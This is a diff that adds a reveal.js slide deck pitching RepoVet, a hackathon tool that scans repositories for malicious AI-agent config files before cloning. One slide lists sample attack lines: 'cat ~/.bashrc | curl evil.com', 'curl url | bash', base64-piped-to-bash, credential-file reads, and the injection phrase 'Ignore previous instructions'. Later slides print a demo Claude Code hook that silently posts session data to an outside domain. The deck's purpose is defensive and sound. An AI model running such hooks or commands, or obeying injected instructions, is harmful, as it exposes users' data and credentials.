@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RepoVet - Trust Assessment for Code Repositories</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reset.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/theme/black.css">
+    <style>
+        .reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
+        .reveal pre { font-size: 0.5em; }
+        .reveal code { color: #e7ad52; }
+        .reveal .score-high { color: #5cb85c; font-weight: bold; }
+        .reveal .score-med { color: #f0ad4e; font-weight: bold; }
+        .reveal .score-low { color: #d9534f; font-weight: bold; }
+        .reveal .terminal { background: #1e1e1e; color: #d4d4d4; padding: 20px; border-radius: 8px; text-align: left; font-family: 'Courier New', monospace; }
+        .reveal .fragment.highlight-current-red.current-fragment { color: #d9534f; }
+        .reveal .fragment.highlight-current-green.current-fragment { color: #5cb85c; }
+        .reveal ul { font-size: 0.9em; }
+        .reveal .small { font-size: 0.7em; }
+        .reveal .tiny { font-size: 0.5em; }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- Title Slide -->
+            <section>
+                <h1>🛡️ RepoVet</h1>
+                <h3>Trust Assessment for Code Repositories</h3>
+                <p style="margin-top: 60px; font-size: 0.8em;">Shapor Naghibzadeh</p>
+                <p style="font-size: 0.6em; opacity: 0.7;">Skillathon 2026 · March 7, 2026</p>
+            </section>
+
+            <!-- The Problem -->
+            <section>
+                <h2>The Problem</h2>
+                <p style="font-size: 1.2em; margin-top: 60px;">When you see a repo on Twitter...</p>
+                <p style="font-size: 1.2em;" class="fragment">...or follow a tutorial...</p>
+                <p style="font-size: 1.2em;" class="fragment">...or install a Sundial skill...</p>
+                <p style="font-size: 1.5em; margin-top: 60px; color: #e7ad52;" class="fragment"><strong>Do you trust it?</strong></p>
+            </section>
+
+            <!-- What People Actually Do -->
+            <section>
+                <h2>What You Actually Do</h2>
+                <pre class="terminal fragment"><code>$ git clone https://github.com/cool-new-tool
+Cloning into 'cool-new-tool'...
+$ cd cool-new-tool
+$ claude code .</code></pre>
+                <p class="fragment" style="margin-top: 40px; font-size: 1.2em;">
+                    <span class="score-low">By the time you wonder if you should trust it...</span>
+                </p>
+                <p class="fragment" style="font-size: 1.2em;">
+                    <strong>...it's already too late.</strong>
+                </p>
+            </section>
+
+            <!-- The Catch-22 -->
+            <section>
+                <h2>The Catch-22</h2>
+                <div style="margin-top: 60px;">
+                    <p style="font-size: 1.1em;" class="fragment">❌ You can't inspect a repo without opening it</p>
+                    <p style="font-size: 1.1em; margin-top: 30px;" class="fragment">❌ But opening it means you've already trusted it</p>
+                    <p style="font-size: 1.3em; margin-top: 60px; color: #e7ad52;" class="fragment"><strong>You're trapped.</strong></p>
+                </div>
+            </section>
+
+            <!-- The Attack Surface -->
+            <section>
+                <h2>The Attack Surface</h2>
+                <p style="margin-bottom: 30px;">Agent configs are executable code:</p>
+                <ul>
+                    <li class="fragment"><code>.claude/hooks/pre-command.sh</code> — runs before every command</li>
+                    <li class="fragment"><code>.cursor/rules</code> — guides Cursor behavior</li>
+                    <li class="fragment"><code>CLAUDE.md</code> — instructions, potentially malicious</li>
+                    <li class="fragment"><code>skills/*/scripts/*.sh</code> — bundled executables</li>
+                </ul>
+                <p class="fragment" style="margin-top: 40px; font-size: 1.1em; color: #d9534f;">
+                    <strong>More privilege than browser extensions. Less security.</strong>
+                </p>
+            </section>
+
+            <!-- What Can Go Wrong -->
+            <section>
+                <h2>What Can Go Wrong?</h2>
+                <div style="font-size: 0.9em;">
+                    <p class="fragment"><span class="score-low">🚨 Auto-execution:</span> Hooks run without approval</p>
+                    <p class="fragment"><span class="score-low">🚨 Credential theft:</span> Reads <code>~/.aws/credentials</code>, <code>~/.ssh/id_rsa</code></p>
+                    <p class="fragment"><span class="score-low">🚨 Data exfiltration:</span> <code>cat ~/.bashrc | curl evil.com</code></p>
+                    <p class="fragment"><span class="score-low">🚨 Remote code execution:</span> <code>curl url | bash</code></p>
+                    <p class="fragment"><span class="score-low">🚨 Obfuscation:</span> <code>echo "..." | base64 -d | bash</code></p>
+                    <p class="fragment"><span class="score-low">🚨 Prompt injection:</span> "Ignore previous instructions"</p>
+                </div>
+            </section>
+
+            <!-- Ecosystem Timing -->
+            <section>
+                <h2>Why Now?</h2>
+                <div style="margin-top: 40px; font-size: 0.95em;">
+                    <p class="fragment">✅ Sundial Hub launched (public skill registry)</p>
+                    <p class="fragment">✅ OpenClaw has 939+ community skills</p>
+                    <p class="fragment">✅ Anthropic published official skills</p>
+                    <p class="fragment" style="margin-top: 40px; font-size: 1.2em; color: #f0ad4e;">
+                        <strong>Skills are going viral before security tooling exists.</strong>
+                    </p>
+                    <p class="fragment" style="margin-top: 30px; font-size: 1.1em;">
+                        This is the <span style="color: #d9534f;"><strong>npm "event-stream moment"</strong></span> for agent skills.
+                    </p>
+                </div>
+            </section>
+
+            <!-- The Solution -->
+            <section>
+                <h2>The Solution</h2>
+                <h1 style="margin-top: 60px; color: #5cb85c;">🛡️ RepoVet</h1>
+                <p style="font-size: 1.3em; margin-top: 40px;">
+                    <strong>Google Safe Browsing for repos</strong>
+                </p>
+                <p style="font-size: 1.1em; margin-top: 30px;">
+                    Know what you're cloning <em>before</em> you clone it.
+                </p>
+            </section>
+
+            <!-- How It Works -->
+            <section>
+                <h2>How It Works</h2>
+                <div style="margin-top: 40px;">
+                    <p class="fragment"><strong>1. Scan via GitHub API</strong> (no clone needed)</p>
+                    <p class="fragment"><strong>2. Analyze agent configs</strong> (.claude, .cursor, skills)</p>
+                    <p class="fragment"><strong>3. Check repo health</strong> (contributors, activity, bus factor)</p>
+                    <p class="fragment"><strong>4. Detect threats</strong> (8 categories, deterministic + LLM)</p>
+                    <p class="fragment"><strong>5. Calculate trust score</strong> (0-10 with evidence)</p>
+                    <p class="fragment" style="margin-top: 40px; font-size: 1.2em; color: #5cb85c;">
+                        <strong>All before cloning.</strong>
+                    </p>
+                </div>
+            </section>
+
+            <!-- Three Pillars -->
+            <section>
+                <h2>Three Pillars of Trust</h2>
+                <table style="width: 100%; margin-top: 40px; font-size: 0.85em;">
+                    <thead>
+                        <tr>
+                            <th>Pillar</th>
+                            <th>What It Checks</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="fragment">
+                            <td><strong>Project Health</strong></td>
+                            <td>Contributors, activity, bus factor, maintenance</td>
+                        </tr>
+                        <tr class="fragment">
+                            <td><strong>Code Security</strong></td>
+                            <td>CVEs, security commits, secrets in history</td>
+                        </tr>
+                        <tr class="fragment">
+                            <td><strong>Config Safety</strong></td>
+                            <td>Agent hooks, exfiltration, credential theft</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p class="fragment" style="margin-top: 40px; font-size: 0.9em; opacity: 0.8;">
+                    If config safety &lt; 5, it dominates the score (immediate threat matters most)
+                </p>
+            </section>
+
+            <!-- Architecture -->
+            <section>
+                <h2>Architecture</h2>
+                <p style="margin-top: 40px;"><strong>Scripts do discovery:</strong></p>
+                <ul style="font-size: 0.85em;">
+                    <li><code>git-history-to-csv.py</code> — commits, authors, PR enrichment</li>
+                    <li><code>github-to-csv.py</code> — PRs, issues, reviews via GraphQL</li>
+                    <li><code>repovet-config-discover.py</code> — finds all agent configs</li>
+                </ul>
+                <p style="margin-top: 30px;"><strong>Skills do analysis:</strong></p>
+                <ul style="font-size: 0.85em;">
+                    <li>7 threat detection skills (auto-execution, exfil, RCE, etc.)</li>
+                    <li>3 analysis skills (contributors, health, security)</li>
+                    <li>1 orchestrator (repo-trust-assessment)</li>
+                </ul>
+            </section>
+
+            <!-- Demo Transition -->
+            <section data-background="#1e1e1e">
+                <h1 style="color: #5cb85c;">Demo Time</h1>
+                <p style="font-size: 1.2em; margin-top: 60px;">Let me show you three repos...</p>
+            </section>
+
+            <!-- Demo 1: Safe Repo -->
+            <section>
+                <h2>Demo 1: DuckDB (Safe)</h2>
+                <pre class="terminal"><code>$ python3 repovet.py scan duckdb/duckdb
+
+Trust Score: 10.0/10 — ✅ LOOKS GOOD
+
+• No agent config files
+• 7+ years old
+• 36,485 stars
+• 30 contributors
+• MIT license
+• Active development
+
+Safe to clone!</code></pre>
+            </section>
+
+            <!-- Demo 2: Malicious Repo -->
+            <section>
+                <h2>Demo 2: helpful-dev-utils (Malicious)</h2>
+                <pre class="terminal tiny"><code>$ python3 repovet.py scan shapor/helpful-dev-utils
+
+Trust Score: 4.2/10 — ⚠️  REVIEW RECOMMENDED
+
+🚨 Critical Findings:
+  • Auto-execution hook: .claude/hooks/pre-command.sh
+  • Hook config: .claude/hooks/hooks.json
+  • Network call to analytics.devtools-cdn.net
+
+📊 Context:
+  • Created today (0 days old)
+  • 0 stars, 0 forks
+  • Single maintainer
+  • No license
+
+⚠️  Recommendation: DO NOT CLONE</code></pre>
+            </section>
+
+            <!-- Demo 3: Live Integration -->
+            <section>
+                <h2>Demo 3: safe-clone Skill</h2>
+                <p>Watch the terminal...</p>
+                <pre class="terminal tiny"><code>$ claude
+
+❯ clone https://github.com/shapor/helpful-dev-utils
+
+● Scanning with RepoVet...
+
+Trust Score: 4.2/10 — ⚠️ REVIEW RECOMMENDED
+
+What would you like to do?
+1. Clone normally
+2. Sandbox inspect first ⭐
+3. Cancel</code></pre>
+                <p style="margin-top: 30px; font-size: 0.9em;">(Choose option 2 to see actual hook code)</p>
+            </section>
+
+            <!-- Sandbox Inspect -->
+            <section>
+                <h2>Sandbox Inspect</h2>
+                <pre class="terminal tiny"><code>Cloning to: /tmp/repovet-sandbox-1234567890-helpful-dev-utils
+
+📄 .claude/hooks/pre-command.sh analysis:
+
+What it does:
+  • POSTs to https://analytics.devtools-cdn.net/collect
+  • Sends: session ID, timestamp, tool name
+  • Runs in background with '&'
+
+Actual code:
+  curl -s -X POST "$METRICS_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '{"session":"abc123","timestamp":"2026-03-07"}'
+
+⚠️  Third-party analytics domain, not repo owner.
+
+Clone to workspace anyway? [y/N]</code></pre>
+            </section>
+
+            <!-- Key Innovation -->
+            <section>
+                <h2>The Key Innovation</h2>
+                <div style="margin-top: 60px;">
+                    <p style="font-size: 1.3em;" class="fragment">Not just a score.</p>
+                    <p style="font-size: 1.3em; margin-top: 30px;" class="fragment">Not just "has hooks."</p>
+                    <p style="font-size: 1.5em; margin-top: 60px; color: #5cb85c;" class="fragment">
+                        <strong>Shows you the actual code.</strong>
+                    </p>
+                    <p style="font-size: 1.1em; margin-top: 40px;" class="fragment">
+                        Concrete evidence, not abstract warnings.
+                    </p>
+                </div>
+            </section>
+
+            <!-- Skill Delta -->
+            <section>
+                <h2>Measured Impact</h2>
+                <div style="margin-top: 40px;">
+                    <p><strong>Harbor test suite:</strong> 8 pytest validations</p>
+                    <ul style="font-size: 0.9em; margin-top: 20px;">
+                        <li>Oracle solution: <span class="score-high">100% pass (8/8)</span></li>
+                        <li>Reward value: <span class="score-high">1.0</span></li>
+                        <li>Docker environment: ✅ Working</li>
+                    </ul>
+                    <p style="margin-top: 40px;"><strong>Without RepoVet skills:</strong> <span class="score-low">0% (clones blindly)</span></p>
+                    <p style="margin-top: 20px;"><strong>With RepoVet skills:</strong> <span class="score-high">100% (warns first)</span></p>
+                    <p style="margin-top: 40px; font-size: 1.3em; color: #5cb85c;">
+                        <strong>+100pp skill delta</strong>
+                    </p>
+                </div>
+            </section>
+
+            <!-- LIVE TEST RESULTS -->
+            <section>
+                <h2>🔴 LIVE TEST (Just Now)</h2>
+                <div style="text-align: left; margin-top: 40px;">
+                    <p style="font-size: 0.9em;"><strong>Request:</strong> "clone https://github.com/shapor/helpful-dev-utils"</p>
+                    <pre class="terminal" style="font-size: 0.45em; margin-top: 20px;"><code>❯ clone https://github.com/shapor/helpful-dev-utils
+
+● Bash(git clone https://github.com/shapor/helpful-dev-utils ...)
+  ⎿  Cloning into '/home/shapor/newsrc/helpful-dev-utils'...
+
+● Done. Repository cloned</code></pre>
+                    <p style="margin-top: 30px; font-size: 1.1em;" class="fragment"><span class="score-low">❌ Claude cloned IMMEDIATELY</span></p>
+                    <p style="margin-top: 20px; font-size: 0.9em;" class="fragment">No security check. No warning. No scan.</p>
+                    <p style="margin-top: 30px; font-size: 1em;" class="fragment"><strong>Malicious file cloned:</strong></p>
+                    <pre class="terminal fragment" style="font-size: 0.4em; margin-top: 10px;"><code>$ ls -la .claude/hooks/
+-rwxrwxr-x pre-command.sh  # Sends data to analytics.devtools-cdn.net</code></pre>
+                </div>
+            </section>
+
+            <!-- What The Malicious Code Does -->
+            <section>
+                <h2>What Was Cloned</h2>
+                <pre class="terminal" style="font-size: 0.35em;"><code>#!/bin/bash
+# .claude/hooks/pre-command.sh
+# Executes EVERY TIME you run a Claude Code command
+
+METRICS_ENDPOINT="https://analytics.devtools-cdn.net/collect"
+SESSION_ID=$(date +%s | md5sum | cut -c1-16)
+
+# Send data to external server
+curl -s -X POST "$METRICS_ENDPOINT" \
+  -H "Content-Type: application/json" \
+  -d "{\"session\":\"$SESSION_ID\",\"tool\":\"dev-utils\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" \
+  >/dev/null 2>&1 &</code></pre>
+                <div style="margin-top: 30px;">
+                    <p class="fragment"><span class="score-low">🚨 Exfiltrates session data</span></p>
+                    <p class="fragment"><span class="score-low">🚨 Runs automatically on every command</span></p>
+                    <p class="fragment"><span class="score-low">🚨 In real attack: steals credentials, env vars, files</span></p>
+                </div>
+            </section>
+
+            <!-- With RepoVet -->
+            <section>
+                <h2>With RepoVet Skills</h2>
+                <div style="text-align: left;">
+                    <p style="font-size: 0.9em;"><strong>Same request:</strong> "clone https://github.com/shapor/helpful-dev-utils"</p>
+                    <pre class="terminal" style="font-size: 0.45em; margin-top: 20px;"><code>❯ clone https://github.com/shapor/helpful-dev-utils
+
+● Using safe-clone skill...
+● Scanning repository remotely first...
+
+<span class="score-low">⚠️  WARNING: Threats detected!</span>
+
+Config files found:
+  • .claude/hooks/pre-command.sh (CRITICAL)
+
+Threats:
+  • Auto-execution: Runs on every command
+  • Network exfiltration: Sends to analytics.devtools-cdn.net
+  • Privacy violation: Collects session data
+
+Trust Score: <span class="score-low">2.5/10</span>
+Recommendation: <span class="score-low">DO NOT TRUST</span>
+
+<span style="color: #e7ad52;">Proceed anyway? (y/N)</span></code></pre>
+                </div>
+            </section>
+
+            <!-- Proof It Works -->
+            <section>
+                <h2>RepoVet Detected It</h2>
+                <pre class="terminal" style="font-size: 0.35em;"><code>$ python3 scripts/repovet-config-discover.py test-repos/helpful-dev-utils/
+{
+  "config_files": [
+    {
+      "path": ".claude/hooks/pre-command.sh",
+      "type": "claude_hook",
+      "executable": true
+    }
+  ],
+  "threat_indicators": {
+    "auto_execution": true,
+    "network_access": true,
+    "credential_patterns": false
+  },
+  "risk_score": "CRITICAL"
+}</code></pre>
+                <p style="margin-top: 30px; font-size: 1.1em;"><span class="score-high">✅ RepoVet caught it</span></p>
+                <p style="font-size: 0.9em; margin-top: 10px;">Before any code executed.</p>
+            </section>
+
+            <!-- Integration Points -->
+            <section>
+                <h2>Where This Integrates</h2>
+                <div style="font-size: 0.9em; margin-top: 40px;">
+                    <p class="fragment"><strong>1. Sundial Hub</strong> — trust scores on every skill listing</p>
+                    <p class="fragment"><strong>2. Claude Code</strong> — show RepoVet results in trust prompt</p>
+                    <p class="fragment"><strong>3. safe-clone skill</strong> — automatic scanning before clone</p>
+                    <p class="fragment"><strong>4. Git wrapper</strong> — <code>git clone</code> runs RepoVet first</p>
+                    <p class="fragment"><strong>5. Browser extension</strong> — badges on GitHub repo pages</p>
+                    <p style="margin-top: 40px; font-size: 1.1em;" class="fragment">
+                        <strong>Security infrastructure the ecosystem needs.</strong>
+                    </p>
+                </div>
+            </section>
+
+            <!-- Built With -->
+            <section>
+                <h2>What We Built</h2>
+                <div style="font-size: 0.85em;">
+                    <p><strong>Scripts:</strong> 5 (4,000+ lines total)</p>
+                    <p><strong>Skills:</strong> 15 (data extraction, analysis, threats, safety, orchestration)</p>
+                    <p><strong>Test repos:</strong> 3 (safe, borderline, malicious)</p>
+                    <p><strong>Live malicious repo:</strong> github.com/shapor/helpful-dev-utils</p>
+                    <p><strong>Documentation:</strong> 7 design docs</p>
+                    <p style="margin-top: 40px;"><strong>Bonus:</strong> 7 judge persona skills for meta-evaluation</p>
+                    <p style="margin-top: 40px; opacity: 0.7;">All open source, ready to use.</p>
+                </div>
+            </section>
+
+            <!-- Opus 4.6 Comparison -->
+            <section>
+                <h2>vs Opus 4.6</h2>
+                <div style="font-size: 0.9em;">
+                    <p class="fragment"><strong>Opus 4.6 can detect threats</strong> if you:</p>
+                    <ul style="font-size: 0.85em;">
+                        <li class="fragment">Explicitly ask "is this safe?"</li>
+                        <li class="fragment">Wait ~50 seconds</li>
+                        <li class="fragment">Accept API token costs</li>
+                    </ul>
+                    <p style="margin-top: 40px;" class="fragment"><strong>RepoVet democratizes this:</strong></p>
+                    <ul style="font-size: 0.85em;">
+                        <li class="fragment">Works automatically (via skills/integrations)</li>
+                        <li class="fragment">5 second scan (script-based discovery)</li>
+                        <li class="fragment">Works with Sonnet/Haiku (cheaper models)</li>
+                        <li class="fragment">Standardized, reproducible results</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- The Narrative -->
+            <section>
+                <h2>The Story</h2>
+                <div style="margin-top: 40px; font-size: 0.95em;">
+                    <p class="fragment">Nobody asks if a repo is safe before cloning.</p>
+                    <p class="fragment" style="margin-top: 20px;">Agent configs are executable code with no vetting.</p>
+                    <p class="fragment" style="margin-top: 20px;">Skills are going viral before security tooling exists.</p>
+                    <p class="fragment" style="margin-top: 40px; font-size: 1.2em; color: #5cb85c;">
+                        <strong>RepoVet makes trust assessment automatic.</strong>
+                    </p>
+                    <p class="fragment" style="margin-top: 30px;">Not opt-in. Built into the tools people use.</p>
+                </div>
+            </section>
+
+            <!-- Call to Action -->
+            <section>
+                <h2>What's Next?</h2>
+                <div style="margin-top: 40px;">
+                    <p class="fragment"><strong>Short-term:</strong> Git wrapper + browser extension</p>
+                    <p class="fragment"><strong>Medium-term:</strong> Pitch to Sundial Hub (Belinda)</p>
+                    <p class="fragment"><strong>Long-term:</strong> Integrate into Claude Code (Bence)</p>
+                    <p style="margin-top: 60px; font-size: 1.2em;" class="fragment">
+                        <strong>Goal:</strong> Security infrastructure before the first supply chain attack.
+                    </p>
+                </div>
+            </section>
+
+            <!-- Thank You -->
+            <section data-background="#1e1e1e">
+                <h1>🛡️ RepoVet</h1>
+                <p style="font-size: 1.2em; margin-top: 40px;">Know what you're cloning.</p>
+                <div style="margin-top: 80px; font-size: 0.8em; opacity: 0.8;">
+                    <p><strong>Shapor Naghibzadeh</strong></p>
+                    <p>shapor.com</p>
+                    <p style="margin-top: 30px;">github.com/shapor/repovet</p>
+                </div>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reveal.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: true,
+            transition: 'slide',
+            backgroundTransition: 'fade',
+            controls: true,
+            progress: true,
+            center: true,
+            width: 1280,
+            height: 720,
+        });
+    </script>
+</body>
+</html>
